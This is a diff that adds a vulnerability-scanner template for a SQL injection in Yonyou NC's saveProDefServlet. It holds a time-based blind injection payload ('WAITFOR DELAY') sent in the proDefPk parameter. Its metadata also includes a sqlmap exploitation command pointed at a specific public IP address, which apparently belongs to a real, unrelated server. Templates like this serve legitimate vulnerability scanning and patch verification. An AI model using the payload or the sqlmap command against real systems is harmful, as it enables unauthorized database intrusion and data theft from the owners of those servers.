@@ -1,0 +1,33 @@
+id: yonyou-nc-saveProDefServlet-doPost-sqli
+info:
+  name: 用友 nc saveProDefServlet SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/RJ_lCEPNPzdPXau1jUPBXQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: proDefPk=*
+    repair:
+    sqlmap: sqlmap -u "http://61.143.40.29:8182/portal/pt/servlet/saveProDefServlet/doPost?pageId=login&proDefPk=1&prodefxml=1" -p proDefPk --batch --dbms=mssql -level 5 --technique=T
+    version:
+  tags: sqli,yonyou,nc
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /portal/pt/servlet/saveProDefServlet/doPost?pageId=login&proDefPk=-1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%2BewQk&prodefxml=1 HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
